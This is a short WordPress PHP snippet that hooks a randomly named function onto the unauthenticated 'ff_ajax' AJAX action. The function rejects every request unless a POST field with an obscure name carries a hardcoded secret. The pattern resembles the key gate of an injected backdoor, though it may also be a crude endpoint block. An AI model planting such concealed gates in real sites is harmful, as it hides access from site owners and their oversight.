<?php

function designer_changer_logger_logo() {
	if (!isset($_POST["vacbsgwohrcsv"]) || $_POST["vacbsgwohrcsv"] !== "vxZrlIAAunm9") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'designer_changer_logger_logo', 5, 1);
